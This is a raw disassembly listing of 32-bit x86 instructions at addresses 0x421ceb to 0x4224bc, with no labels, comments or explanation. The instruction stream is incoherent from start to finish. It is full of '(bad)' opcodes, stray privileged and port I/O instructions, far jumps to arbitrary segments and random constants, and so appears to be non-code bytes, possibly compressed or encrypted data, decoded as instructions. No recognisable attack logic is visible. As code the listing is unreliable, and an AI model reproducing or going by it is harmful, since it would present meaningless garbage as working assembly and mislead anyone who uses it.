  421ceb:	fst    DWORD PTR [ebx+eiz*1]
  421cee:	pop    ss
  421cef:	sub    esp,ebp
  421cf1:	bnd jb 0x421d60
  421cf4:	repnz pop eax
  421cf6:	jno    0x421d23
  421cf8:	ins    DWORD PTR es:[edi],dx
  421cf9:	call   0x268d:0xd751e62a
  421d00:	and    ebx,DWORD PTR [esi+0xc3c3a84]
  421d06:	ret    0x637a
  421d09:	sahf   
  421d0a:	int3   
  421d0b:	and    DWORD PTR [edx+0x11],eax
  421d0e:	ficomp DWORD PTR [ecx+0x74]
  421d11:	pop    ecx
  421d12:	mov    eax,0x29b30a7
  421d17:	bound  eax,QWORD PTR [edx-0x276034e1]
  421d1d:	sub    dh,BYTE PTR [edi+edi*1]
  421d20:	das    
  421d21:	inc    ecx
  421d22:	std    
  421d23:	lock xor al,0xdb
  421d26:	push   esi
  421d27:	push   ecx
  421d28:	sar    DWORD PTR [ebp+0x79],1
  421d2b:	clc    
  421d2c:	push   0xe
  421d2e:	xlat   BYTE PTR ds:[ebx]
  421d2f:	xor    eax,0x9adb037
  421d34:	jl     0x421ce3
  421d36:	mov    ebx,ecx
  421d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d39:	sbb    DWORD PTR [eax+0x6c570839],0x2d
  421d40:	js     0x421d5f
  421d42:	xor    ebx,ecx
  421d44:	and    al,0xd1
  421d46:	pop    ebp
  421d47:	outs   dx,DWORD PTR ds:[esi]
  421d48:	mov    dl,BYTE PTR [ebx+0x54]
  421d4b:	in     eax,dx
  421d4c:	push   ss
  421d4d:	push   ecx
  421d4e:	adc    ecx,DWORD PTR [ebx+ebp*2+0x57207f1b]
  421d55:	imul   ecx,DWORD PTR [eax-0x7a05c3d3],0xffffffc5
  421d5c:	sbb    al,0xb9
  421d5e:	or     BYTE PTR [edi],bh
  421d60:	push   ebx
  421d61:	mov    dh,0x5d
  421d63:	cwde   
  421d64:	fs inc esi
  421d66:	mov    eax,ds:0x8ada40d6
  421d6b:	mov    bh,cl
  421d6d:	mov    eax,DWORD PTR [ebx+0x3]
  421d70:	mov    ch,0xb4
  421d72:	pop    eax
  421d73:	retf   
  421d74:	loope  0x421d24
  421d76:	out    dx,eax
  421d77:	ror    DWORD PTR [esi],1
  421d79:	clc    
  421d7a:	push   ds
  421d7b:	dec    ecx
  421d7c:	pop    ss
  421d7d:	fild   WORD PTR [edi-0x50]
  421d80:	xchg   ecx,eax
  421d81:	add    ch,BYTE PTR [edi+0x57]
  421d84:	sub    BYTE PTR [edx-0x67],dl
  421d87:	dec    edx
  421d88:	lods   eax,DWORD PTR ds:[esi]
  421d89:	adc    al,0x29
  421d8b:	mov    DWORD PTR [eax+0x682a3c5a],esi
  421d91:	inc    ebp
  421d92:	ret    0xe17a
  421d95:	xor    eax,0x3bf03d8d
  421d9a:	xor    al,0xa4
  421d9c:	mul    DWORD PTR [esi-0x566793d8]
  421da2:	test   DWORD PTR [edi+0x7a],ebx
  421da5:	dec    esi
  421da6:	ss cli 
  421da8:	xor    dl,ah
  421daa:	repnz imul esp,DWORD PTR [ebp-0xb],0x2
  421daf:	jmp    0x421d7e
  421db1:	adc    BYTE PTR [ebx],bh
  421db3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421db5:	xchg   edx,eax
  421db6:	(bad)  
  421db7:	and    cl,bh
  421db9:	leave  
  421dba:	mov    cs:0xad10be3b,al
  421dc0:	cli    
  421dc1:	push   eax
  421dc2:	sar    DWORD PTR [eax-0x6476fd],cl
  421dc8:	sub    al,0xcf
  421dca:	add    bl,BYTE PTR [edx-0x650f73a9]
  421dd0:	inc    ebp
  421dd1:	push   edx
  421dd2:	or     eax,0xfab4e296
  421dd7:	cmp    edx,esp
  421dd9:	loope  0x421db0
  421ddb:	ss ret 0x7873
  421ddf:	push   0x58
  421de1:	sbb    al,0xda
  421de3:	xor    DWORD PTR ds:0x34848942,ebx
  421de9:	dec    ecx
  421dea:	xchg   esi,eax
  421deb:	stos   BYTE PTR es:[edi],al
  421dec:	daa    
  421ded:	neg    BYTE PTR [edi]
  421def:	sbb    esi,esi
  421df1:	cli    
  421df2:	mov    ds:0xf2b4152e,eax
  421df7:	loope  0x421e1e
  421df9:	in     eax,dx
  421dfa:	jp     0x421da9
  421dfc:	(bad)  [ecx-0x520b900f]
  421e02:	cmp    eax,0x35083b85
  421e07:	xchg   edi,eax
  421e08:	or     eax,0x5d9f6fa
  421e0d:	syscall 
  421e0f:	nop
  421e10:	and    eax,0x18f856d2
  421e15:	xchg   ebp,eax
  421e16:	jns    0x421e70
  421e18:	lock cdq 
  421e1a:	and    bl,BYTE PTR [edx]
  421e1c:	rol    BYTE PTR [esi],1
  421e1e:	jns    0x421dc5
  421e20:	mov    ecx,0x2fc4d460
  421e25:	(bad)  
  421e26:	test   DWORD PTR [edx+0x17cf9e2d],edx
  421e2c:	adc    esp,DWORD PTR [edi-0x67]
  421e2f:	enterw 0x890f,0x78
  421e34:	shr    DWORD PTR [ebx+0x9],0x48
  421e38:	mov    ebx,0x6a1f7b07
  421e3d:	cmp    eax,0x45a8e8cc
  421e42:	mov    ebx,0x4edac6e3
  421e47:	or     eax,0x17458cb4
  421e4c:	pop    edx
  421e4d:	(bad)  
  421e4e:	mov    esp,0x833876d0
  421e53:	and    edx,ebx
  421e55:	lods   al,BYTE PTR ds:[esi]
  421e56:	out    0xdf,eax
  421e58:	jns    0x421e43
  421e5a:	fisubr DWORD PTR [edi+eax*2-0x5103ff77]
  421e61:	in     eax,0x65
  421e63:	or     al,ch
  421e65:	sbb    BYTE PTR [ebx],al
  421e67:	jp     0x421e7c
  421e69:	mov    edi,0x9faf139d
  421e6e:	hlt    
  421e6f:	fimul  DWORD PTR [ebx-0x4b]
  421e72:	int    0x0
  421e74:	ja     0x421e94
  421e76:	ja     0x421ea5
  421e78:	rcr    DWORD PTR [edx-0x30],cl
  421e7b:	repnz hlt 
  421e7d:	jmp    0x8c6e:0xd8d64952
  421e84:	lock test eax,0x5690188d
  421e8a:	xchg   ebx,eax
  421e8b:	fs loope 0x421e76
  421e8e:	add    DWORD PTR [eax-0x78],0xffffffe2
  421e92:	js     0x421f00
  421e94:	ret    
  421e95:	fistp  DWORD PTR [ebx]
  421e97:	mov    dl,0x90
  421e99:	dec    edx
  421e9a:	and    edx,DWORD PTR [ebp+0x7a]
  421e9d:	sbb    al,0x4e
  421e9f:	jmp    0x421e65
  421ea1:	int3   
  421ea2:	outs   dx,DWORD PTR ds:[esi]
  421ea3:	or     DWORD PTR [ecx+0x52774670],ebx
  421ea9:	adc    DWORD PTR [esp+edi*4-0x32],eax
  421ead:	jg     0x421e91
  421eaf:	int3   
  421eb0:	pop    eax
  421eb1:	jecxz  0x421ecb
  421eb3:	and    eax,DWORD PTR [edi]
  421eb5:	push   edi
  421eb6:	sahf   
  421eb7:	ins    BYTE PTR es:[edi],dx
  421eb8:	xor    bh,BYTE PTR [ecx-0x60]
  421ebb:	push   edx
  421ebc:	xchg   esp,eax
  421ebd:	xchg   esp,eax
  421ebe:	outs   dx,BYTE PTR ds:[esi]
  421ebf:	aas    
  421ec0:	int3   
  421ec1:	js     0x421e5d
  421ec3:	ror    BYTE PTR [ecx+0x37e05029],cl
  421ec9:	jae    0x421efd
  421ecb:	and    eax,0x2d847a94
  421ed0:	lock inc eax
  421ed2:	push   eax
  421ed3:	cld    
  421ed4:	or     edx,DWORD PTR [esi]
  421ed6:	and    eax,0xdb586e62
  421edb:	scas   eax,DWORD PTR es:[edi]
  421edc:	mov    bh,0x6c
  421ede:	pop    ss
  421edf:	lds    ebx,FWORD PTR [eax+0x61fcb6c1]
  421ee5:	inc    esi
  421ee6:	push   cs
  421ee7:	stos   BYTE PTR es:[edi],al
  421ee8:	int3   
  421ee9:	mov    dl,bh
  421eeb:	in     al,dx
  421eec:	adc    al,0x58
  421eee:	ret    
  421eef:	dec    ebx
  421ef0:	inc    edi
  421ef1:	xor    eax,0x50821016
  421ef6:	gs pop esp
  421ef8:	sub    bl,dh
  421efa:	fistp  WORD PTR [ebx+0x0]
  421efd:	mov    bl,0x71
  421eff:	and    eax,0xae36f761
  421f04:	mov    dh,0xc3
  421f06:	pusha  
  421f07:	hlt    
  421f08:	adc    ch,BYTE PTR [ebx]
  421f0a:	and    eax,0x269f46a7
  421f0f:	shl    ch,1
  421f11:	or     al,ch
  421f13:	add    eax,esi
  421f15:	xchg   ebp,eax
  421f16:	jne    0x421f4e
  421f18:	aaa    
  421f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f1a:	cmp    al,0xb6
  421f1c:	imul   ebx,edx,0x12
  421f1f:	xchg   BYTE PTR [edi-0xb54257d],ch
  421f25:	data16 aaa 
  421f27:	loopne 0x421fa0
  421f29:	les    eax,FWORD PTR [ebp-0x6aec449f]
  421f2f:	xchg   esp,eax
  421f30:	ror    BYTE PTR [eax-0x6a59431e],0x29
  421f37:	xchg   edx,eax
  421f38:	or     DWORD PTR [edx-0x6b795442],0x14dfab6
  421f42:	fcom   QWORD PTR [edi]
  421f44:	pop    ss
  421f45:	out    dx,al
  421f46:	mov    bl,0x64
  421f48:	in     eax,dx
  421f49:	rcr    ecx,0xac
  421f4c:	jmp    0x6194:0x11704ad7
  421f53:	dec    esi
  421f54:	inc    edx
  421f55:	jo     0x421ef9
  421f57:	cmp    DWORD PTR [ebx],ecx
  421f59:	popa   
  421f5a:	div    DWORD PTR [eax+0x4e]
  421f5d:	and    bh,0x1d
  421f60:	pushf  
  421f61:	adc    al,0x2
  421f63:	sub    eax,0xbc7d1175
  421f68:	lock jns 0x421f53
  421f6b:	xor    al,0x4c
  421f6d:	test   eax,0xd660418
  421f72:	arpl   WORD PTR [edx-0x264873ff],sp
  421f78:	arpl   di,sp
  421f7a:	out    0x5,al
  421f7c:	shl    cl,1
  421f7e:	repz ds mov ecx,0xcc154143
  421f85:	ds (bad) 
  421f87:	sub    bh,BYTE PTR [edx]
  421f89:	jo     0x421fcc
  421f8b:	or     dh,bl
  421f8d:	repz push ds
  421f8f:	mov    bh,0xf
  421f91:	pop    esp
  421f92:	es cmc 
  421f94:	loope  0x421f3b
  421f96:	call   0x73622b88
  421f9b:	add    BYTE PTR [edx+0x41],0xe6
  421f9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fa0:	ror    BYTE PTR [esi],cl
  421fa2:	fwait
  421fa3:	mov    eax,ds:0xc98eee1b
  421fa8:	sub    eax,0x5d73bbf9
  421fad:	and    BYTE PTR [esi+eiz*4+0x12e84d39],0x87
  421fb5:	call   FWORD PTR [edx+0x50a853bd]
  421fbb:	cli    
  421fbc:	mov    ecx,0x2fde2ba5
  421fc1:	jae    0x421fb9
  421fc3:	or     eax,0xb4a37180
  421fc8:	sbb    ebp,DWORD PTR [ebp-0x124f1cf7]
  421fce:	repnz outs dx,BYTE PTR ds:[esi]
  421fd0:	lods   al,BYTE PTR ds:[esi]
  421fd1:	mov    eax,ds:0x4e5ba0c8
  421fd6:	call   0x9dcfd781
  421fdb:	scas   al,BYTE PTR es:[edi]
  421fdc:	pop    esi
  421fdd:	lods   al,BYTE PTR ds:[esi]
  421fde:	jg     0x421f73
  421fe0:	jge    0x421f94
  421fe2:	(bad)  
  421fe3:	ja     0x421fdb
  421fe5:	aad    0x85
  421fe7:	pop    ds
  421fe8:	dec    edi
  421fe9:	push   ds
  421fea:	retf   
  421feb:	mov    esi,ebp
  421fed:	cli    
  421fee:	xchg   ebp,eax
  421ff0:	jns    0x421f80
  421ff2:	jo     0x421f86
  421ff4:	dec    ecx
  421ff5:	or     dh,al
  421ff7:	add    cl,BYTE PTR [ebx+0xf9a152b]
  421ffd:	addr16 mov bh,0x38
  422000:	adc    al,0xb0
  422002:	mov    esi,0x1d886687
  422007:	popa   
  422008:	jmp    0x58d1:0x829f676f
  42200f:	imul   esi,DWORD PTR [ebx+edi*8-0x71c0a3d2],0xea58e24b
  42201a:	jb     0x421ff1
  42201c:	jmp    0x289d:0x79d85302
  422023:	sbb    al,0x34
  422025:	pop    edx
  422026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422027:	mov    ss,WORD PTR gs:[edi]
  42202a:	in     eax,dx
  42202b:	mov    ch,0xd2
  42202d:	xor    cl,ah
  42202f:	mov    ebp,0x6a36c9af
  422034:	sbb    eax,0x687acf1a
  422039:	popf   
  42203a:	sub    dl,BYTE PTR [ecx+0x44066c4d]
  422040:	test   bl,cl
  422042:	aaa    
  422043:	(bad)  
  422044:	mov    al,0xdc
  422046:	rcr    BYTE PTR [ecx],cl
  422048:	sub    BYTE PTR [ebx+0x5e],bh
  42204b:	pop    esp
  42204c:	cdq    
  42204d:	cmp    al,0x52
  42204f:	push   cs
  422050:	and    al,0x94
  422052:	inc    ecx
  422053:	sbb    al,0x9a
  422055:	nop
  422056:	sahf   
  422057:	sar    esi,1
  422059:	push   edi
  42205a:	dec    esp
  42205b:	test   BYTE PTR [ecx],al
  42205d:	xor    ebx,DWORD PTR [ebx+0x75]
  422060:	add    DWORD PTR [edi-0x1a],0xf705f1e8
  422067:	jo     0x422005
  422069:	jns    0x421feb
  42206b:	js     0x42208f
  42206d:	xchg   ebp,eax
  42206e:	pop    ebp
  42206f:	mov    bh,0x1
  422071:	fisttp DWORD PTR [ebx-0xe]
  422074:	sbb    dl,BYTE PTR [esi+0x14385348]
  42207a:	sub    eax,0xdf644814
  42207f:	std    
  422080:	cmp    al,BYTE PTR [ebp-0x6757392f]
  422086:	inc    esi
  422087:	adc    eax,0x528258b4
  42208c:	lods   eax,DWORD PTR ds:[esi]
  42208d:	or     al,0xa9
  42208f:	adc    al,0x16
  422091:	dec    eax
  422092:	mov    cl,0x41
  422094:	mov    dl,0x7c
  422096:	push   ss
  422097:	loope  0x4220c8
  422099:	sub    al,0xa2
  42209b:	mov    BYTE PTR [ebx],ah
  42209d:	(bad)  
  42209f:	xchg   esi,eax
  4220a0:	xchg   edi,eax
  4220a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220a2:	aad    0x95
  4220a4:	(bad)  
  4220a5:	call   0x8ae3:0x189b5a82
  4220ac:	push   cs
  4220ad:	push   es
  4220ae:	pushf  
  4220af:	add    dh,BYTE PTR [eax+eax*8]
  4220b2:	pusha  
  4220b3:	aas    
  4220b4:	push   esi
  4220b5:	das    
  4220b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220b7:	pop    esp
  4220b8:	xchg   BYTE PTR [eax+0x6a1b2ca2],ah
  4220be:	aad    0x68
  4220c0:	loope  0x42210a
  4220c2:	add    BYTE PTR [edi-0x7085585c],ch
  4220c8:	sbb    ecx,ebp
  4220ca:	dec    edx
  4220cb:	or     dl,0x11
  4220ce:	ds out 0xa8,al
  4220d1:	fst    DWORD PTR [esi+edx*8]
  4220d4:	mov    al,ds:0xe5d45860
  4220d9:	cs int 0x10
  4220dc:	jnp    0x42207a
  4220de:	imul   ebp,esp,0x17
  4220e1:	jne    0x422097
  4220e3:	lock call 0x1ef79771
  4220e9:	dec    esp
  4220ea:	mov    ecx,0xca4f7f12
  4220ef:	adc    DWORD PTR [edi+0x64],esp
  4220f2:	pop    ebx
  4220f3:	fmul   DWORD PTR [edx-0x2535e611]
  4220f9:	imul   ecx,DWORD PTR [eax+0x1a1de4ff],0xfffffff4
  422100:	xchg   esi,eax
  422101:	adc    cl,BYTE PTR [eax+0x30]
  422104:	test   eax,0xa4595bf1
  422109:	int    0x68
  42210b:	or     al,0x89
  42210d:	jg     0x422140
  42210f:	ds pop esi
  422111:	prefetch BYTE PTR [ebp-0x12a3cb10]
  422118:	repnz mov dh,0xe5
  42211b:	in     eax,dx
  42211c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42211d:	push   eax
  42211e:	dec    edx
  42211f:	and    eax,0x3fa54c47
  422124:	mov    esp,0x88394b81
  422129:	sbb    al,0xf2
  42212b:	push   edx
  42212c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42212d:	stos   BYTE PTR es:[edi],al
  42212e:	cld    
  42212f:	pop    ss
  422130:	into   
  422131:	mov    esp,DWORD PTR [ecx+0x11]
  422134:	xor    BYTE PTR [eax-0xb2e32a4],dh
  42213a:	push   ecx
  42213b:	scas   al,BYTE PTR es:[edi]
  42213c:	xor    al,0xa4
  42213e:	push   eax
  42213f:	mov    bl,0x9
  422141:	inc    edi
  422142:	mov    ?,WORD PTR [edi+0x64]
  422145:	ret    0x7599
  422148:	out    0x9c,al
  42214a:	lahf   
  42214b:	dec    edi
  42214c:	mov    cl,0xde
  42214e:	es jecxz 0x42211a
  422151:	es mov ecx,eax
  422154:	stos   BYTE PTR es:[edi],al
  422155:	cmp    eax,0xa23d2a84
  42215a:	fst    DWORD PTR [eax-0x43]
  42215d:	pop    esp
  42215e:	mov    eax,ds:0xc8752da
  422163:	sub    bh,BYTE PTR [ebp-0x118ace7e]
  422169:	inc    ebp
  42216a:	inc    ebp
  42216b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42216c:	hlt    
  42216d:	lds    esi,FWORD PTR [edi+0x6f]
  422170:	stos   DWORD PTR es:[edi],eax
  422171:	adc    edx,edx
  422173:	cmp    al,0x7
  422175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422176:	pop    es
  422177:	lahf   
  422178:	pushf  
  422179:	out    dx,eax
  42217a:	add    eax,0x903fff46
  42217f:	inc    edx
  422180:	or     dl,BYTE PTR [edi-0x2773c173]
  422186:	shl    DWORD PTR [edx+0x48],0x46
  42218a:	rcl    DWORD PTR [ecx],0x1f
  42218d:	(bad)  
  42218e:	in     eax,0xc1
  422190:	mov    al,ds:0xbe60831b
  422195:	dec    ecx
  422196:	xchg   DWORD PTR [edx],edx
  422198:	or     al,0x5a
  42219a:	rol    BYTE PTR [edi+eiz*2-0x3f],0xfa
  42219f:	loope  0x4221e9
  4221a1:	in     eax,dx
  4221a2:	pop    ebx
  4221a3:	imul   esi,DWORD PTR [esi-0x1d],0x80bd2fe8
  4221aa:	jmp    0x8de87f76
  4221af:	inc    esi
  4221b0:	addr16 push esp
  4221b2:	sub    bl,bl
  4221b4:	clc    
  4221b5:	and    ebp,ebp
  4221b7:	cmc    
  4221b8:	ret    0xe303
  4221bb:	es (bad) 
  4221bd:	in     eax,0xcc
  4221bf:	add    al,0x2b
  4221c1:	repz or edx,esi
  4221c4:	sub    ch,BYTE PTR [ebp+0x4f]
  4221c7:	sbb    ch,dh
  4221c9:	aam    0x1e
  4221cb:	pop    es
  4221cc:	xor    bh,bl
  4221ce:	jae    0x422231
  4221d0:	es push ebp
  4221d2:	sbb    eax,0xebbf8c18
  4221d7:	dec    esp
  4221d8:	push   edx
  4221d9:	or     BYTE PTR [edi],dl
  4221db:	ret    0xe339
  4221de:	sbb    esp,DWORD PTR [ebp+0x42]
  4221e1:	out    0xc9,eax
  4221e3:	push   eax
  4221e4:	dec    esi
  4221e5:	fwait
  4221e6:	inc    esp
  4221e7:	mov    eax,ds:0xbc611c02
  4221ec:	(bad)  [edx]
  4221ee:	clc    
  4221ef:	xor    ebx,DWORD PTR [edi+ecx*4-0x2f]
  4221f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221f4:	das    
  4221f5:	scas   eax,DWORD PTR es:[edi]
  4221f6:	dec    edx
  4221f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221f8:	jno    0x422226
  4221fa:	sub    edi,DWORD PTR [ecx-0x2]
  4221fd:	popf   
  4221fe:	and    BYTE PTR [eax+0x5edc3c28],ch
  422204:	jge    0x4221dd
  422206:	aam    0xef
  422208:	in     eax,dx
  422209:	mov    DWORD PTR [esi+ebp*8],0xcf67e16e
  422210:	ficomp DWORD PTR [ecx+0x6503a2a3]
  422216:	mov    dh,0x15
  422218:	mov    dl,BYTE PTR [ebp+0x2a]
  42221b:	jl     0x42223b
  42221d:	jno    0x4221d0
  42221f:	xlat   BYTE PTR ds:[ebx]
  422220:	fist   DWORD PTR [ebx]
  422222:	scas   al,BYTE PTR es:[edi]
  422223:	push   eax
  422224:	add    ebp,esi
  422226:	in     eax,dx
  422227:	int    0xe
  422229:	out    0xae,al
  42222b:	cwde   
  42222c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42222d:	mov    esp,0x2b53ae18
  422232:	add    eax,0xada5bfe5
  422237:	mov    gs,WORD PTR [ecx+0x4bdbf718]
  42223d:	mov    edi,0x91b246ee
  422242:	jl     0x42221d
  422244:	adc    ch,al
  422246:	dec    ebp
  422247:	xor    dl,BYTE PTR [esi]
  422249:	xor    ebx,0x301cf619
  42224f:	iret   
  422250:	inc    ebx
  422251:	fisttp QWORD PTR [ebp+0x6d]
  422254:	jp     0x4221db
  422256:	test   al,0xbd
  422258:	data16 rcr dh,cl
  42225b:	icebp  
  42225c:	test   edi,ecx
  42225e:	pop    eax
  42225f:	aas    
  422260:	mov    ebp,0x619ce19f
  422265:	pop    ebx
  422266:	in     eax,dx
  422267:	mov    ah,0x1a
  422269:	hlt    
  42226a:	xor    ebp,esp
  42226c:	inc    esi
  42226d:	bound  eax,QWORD PTR [edx]
  42226f:	xchg   edi,eax
  422270:	xchg   esi,eax
  422271:	sub    ah,al
  422273:	mov    edi,0x90a7e963
  422278:	test   bh,cl
  42227a:	xchg   ebx,eax
  42227b:	mov    edx,0x1d56cdd8
  422280:	repz lea ecx,[eax]
  422283:	pusha  
  422284:	enter  0x6528,0x86
  422288:	sbb    DWORD PTR [ebx+0x22],ecx
  42228b:	sahf   
  42228c:	ret    0x9cea
  42228f:	in     al,dx
  422290:	shl    esi,1
  422292:	pop    edx
  422293:	popf   
  422294:	pusha  
  422295:	(bad)  
  422296:	nop
  422297:	sbb    eax,0xe5c6fbfb
  42229c:	lahf   
  42229d:	pop    esp
  42229e:	or     eax,0x51c1e0e5
  4222a3:	sbb    eax,0x28fe3215
  4222a8:	inc    eax
  4222a9:	sbb    dh,dh
  4222ab:	mov    eax,0x19c24ad6
  4222b0:	add    eax,0xb664a228
  4222b5:	and    esp,ebx
  4222b7:	adc    al,dh
  4222b9:	lock jp 0x422325
  4222bc:	(bad)  
  4222bd:	frstor [edi+0x63ce7da7]
  4222c3:	jle    0x42232f
  4222c5:	xor    DWORD PTR [edi+0x5d],0xffffffa7
  4222c9:	std    
  4222ca:	jns    0x4222a3
  4222cc:	retf   
  4222cd:	out    dx,al
  4222ce:	push   ebp
  4222cf:	in     al,dx
  4222d0:	(bad)  
  4222d2:	cmp    BYTE PTR [ecx-0x9],0xdc
  4222d6:	mov    al,0x9e
  4222d8:	ins    BYTE PTR es:[edi],dx
  4222d9:	push   ds
  4222da:	fcom   QWORD PTR [eax]
  4222dc:	cmp    bl,dh
  4222de:	popf   
  4222df:	jae    0x4222aa
  4222e1:	not    BYTE PTR [ebx+0x7e]
  4222e4:	or     al,0x72
  4222e6:	enter  0xdfa7,0x44
  4222ea:	xor    BYTE PTR [eax+0x6fe09b80],bh
  4222f0:	push   edi
  4222f1:	or     al,0xcd
  4222f3:	stos   BYTE PTR es:[edi],al
  4222f4:	nop
  4222f5:	mov    ebx,0xe76e1d1
  4222fa:	sbb    cl,BYTE PTR [ebx+edi*1]
  4222fd:	mov    edx,0x3f3187b7
  422302:	adc    esp,0x66
  422305:	hlt    
  422306:	cdq    
  422307:	nop
  422308:	push   edx
  422309:	sar    BYTE PTR [esi+0x7],cl
  42230c:	test   DWORD PTR [ebx],ebx
  42230e:	cwde   
  42230f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422310:	jp     0x422377
  422312:	jnp    0x422384
  422314:	adc    al,BYTE PTR [eax+ebx*8-0xf]
  422318:	arpl   WORD PTR [eax-0x843275],sp
  42231e:	call   0x569e:0x66fdc338
  422325:	daa    
  422326:	cli    
  422327:	and    ch,BYTE PTR [esi-0x5f]
  42232a:	je     0x4222f2
  42232c:	cmp    ah,BYTE PTR [ebx]
  42232e:	add    al,0xbc
  422330:	mov    dh,0xe0
  422332:	and    ch,BYTE PTR [ebx+ecx*4-0x7bbf77f2]
  422339:	pop    ds
  42233a:	addr16 in eax,dx
  42233c:	or     DWORD PTR [eax-0xb1db29b],edi
  422342:	push   0xffffff91
  422344:	jb     0x42236f
  422346:	dec    edi
  422347:	jl     0x4223aa
  422349:	jmp    0xc7b182e9
  42234e:	dec    ebp
  42234f:	fsubr  QWORD PTR [ebx]
  422351:	mov    ch,0x45
  422353:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422354:	sub    dh,BYTE PTR [ebp+0x4f86e643]
  42235a:	xor    ecx,edi
  42235c:	xchg   esi,eax
  42235d:	adc    ch,BYTE PTR [edi+edi*8-0x1c]
  422361:	add    edi,DWORD PTR [esi]
  422363:	mov    ds:0x87e478c4,eax
  422368:	pop    ds
  422369:	(bad)  
  42236a:	xor    eax,0x577afd74
  42236f:	pop    es
  422370:	mov    ecx,0x4ab23d4d
  422375:	retf   
  422376:	push   edi
  422377:	sbb    edi,esp
  422379:	adc    al,0x73
  42237b:	xchg   BYTE PTR [esi+0x2a],bh
  42237e:	cmp    ah,BYTE PTR [esp+edx*2-0x315ae574]
  422385:	sub    BYTE PTR [edx-0x6ffbbd87],ah
  42238b:	and    eax,0x7bd85c94
  422390:	out    dx,al
  422391:	mov    cl,0x3
  422393:	pushf  
  422394:	mov    BYTE PTR [esi+edi*4-0x2b],ch
  422398:	cdq    
  422399:	aad    0x45
  42239b:	mov    dl,0x34
  42239d:	hlt    
  42239e:	jns    0x4223e3
  4223a0:	jnp    0x422408
  4223a2:	xor    eax,ebp
  4223a4:	mov    gs,WORD PTR [eax]
  4223a6:	mov    eax,0x8553d784
  4223ab:	imul   esi,DWORD PTR [ecx+0xc0099],0x9a3d37b1
  4223b5:	jno    0x4223ba
  4223b7:	jmp    0x422342
  4223b9:	int    0x6d
  4223bb:	into   
  4223bc:	push   cs
  4223bd:	cmp    al,0x7c
  4223bf:	ret    
  4223c0:	cmp    eax,0x5f194e5a
  4223c5:	cli    
  4223c6:	in     eax,dx
  4223c7:	push   cs
  4223c8:	inc    eax
  4223c9:	push   es
  4223ca:	add    ebp,DWORD PTR [edi+0x55b7dbdb]
  4223d0:	sub    WORD PTR [ecx+0x79],ax
  4223d4:	xchg   edi,eax
  4223d5:	push   edx
  4223d6:	aad    0x38
  4223d8:	inc    ebx
  4223d9:	inc    esp
  4223da:	shl    BYTE PTR [edx+0x2b],cl
  4223dd:	sbb    bh,BYTE PTR [edi-0x57142c9f]
  4223e3:	mov    ch,0x8b
  4223e5:	adc    DWORD PTR [edx],edi
  4223e7:	loop   0x4223f7
  4223e9:	inc    esp
  4223ea:	enter  0x6c76,0xbc
  4223ee:	cli    
  4223ef:	cld    
  4223f0:	fiadd  DWORD PTR [eax]
  4223f2:	xchg   edx,eax
  4223f3:	inc    edi
  4223f4:	repnz push ebp
  4223f6:	sar    BYTE PTR [ebx+0x3a41699],cl
  4223fc:	push   es
  4223fd:	ins    DWORD PTR es:[edi],dx
  4223fe:	popa   
  4223ff:	test   eax,0xb82d2526
  422404:	test   al,0x2d
  422406:	jmp    0x2235c177
  42240b:	call   0x4459ffeb
  422410:	fistp  DWORD PTR [edx+0x42df2466]
  422416:	cmp    esi,DWORD PTR [ebx-0x6279ce7b]
  42241c:	xchg   DWORD PTR [esi],eax
  42241e:	leave  
  42241f:	ss stos BYTE PTR es:[edi],al
  422421:	out    0xdb,eax
  422423:	jecxz  0x4223f6
  422425:	sahf   
  422426:	pop    eax
  422427:	push   ebp
  422428:	rol    bh,1
  42242a:	je     0x422450
  42242c:	xor    DWORD PTR [edx+esi*4-0x36],0xffffffeb
  422431:	mov    WORD PTR [ebx],?
  422433:	push   ss
  422434:	leave  
  422435:	(bad)  
  422436:	out    0xd8,al
  422438:	pop    edi
  422439:	jnp    0x4224aa
  42243b:	jecxz  0x4223f9
  42243d:	xchg   DWORD PTR [esp+ebp*1-0x129f4969],ebp
  422444:	and    edi,DWORD PTR [esp+edi*2]
  422447:	xor    dh,BYTE PTR [ebx+0x26]
  42244a:	ss xchg edx,eax
  42244c:	test   al,0x81
  42244e:	jae    0x4223d6
  422450:	nop
  422451:	das    
  422452:	mov    eax,ds:0xda7beab9
  422457:	add    bh,BYTE PTR [ecx-0x47]
  42245a:	fisttp WORD PTR [esi]
  42245c:	cwde   
  42245d:	pop    esp
  42245e:	cmp    eax,0x478589fd
  422463:	pop    ss
  422464:	pop    edx
  422465:	adc    DWORD PTR [esi+0x172201fc],0x71
  42246c:	dec    ebp
  42246d:	mov    ah,0x39
  42246f:	adc    BYTE PTR [ecx-0x15833987],al
  422475:	xchg   DWORD PTR [edx],ecx
  422477:	or     al,BYTE PTR [esi+0x40]
  42247a:	or     BYTE PTR [ebp-0x47b5f657],al
  422480:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422481:	lock pop edx
  422483:	cs lock inc ebp
  422486:	mov    ebx,0x662544a1
  42248b:	sbb    al,0x3d
  42248d:	or     ebp,DWORD PTR ds:0x94201b77
  422493:	push   ecx
  422494:	jne    0x4224ee
  422496:	fcom   DWORD PTR [ebp+0x7557f50c]
  42249c:	scas   al,BYTE PTR es:[edi]
  42249d:	mov    esi,0x82b5cce4
  4224a2:	and    edx,esi
  4224a4:	fs pop esi
  4224a6:	repz dec edi
  4224a8:	sub    edi,DWORD PTR [ebp+0x48c98f36]
  4224ae:	(bad)
  4224b1:	sbb    DWORD PTR [esi],esi
  4224b3:	inc    ebp
  4224b4:	mov    WORD PTR [esi],?
  4224b6:	adc    ebx,DWORD PTR [ebp+0x1be756ba]
  4224bc:	mov    ebx,0x1062fe59
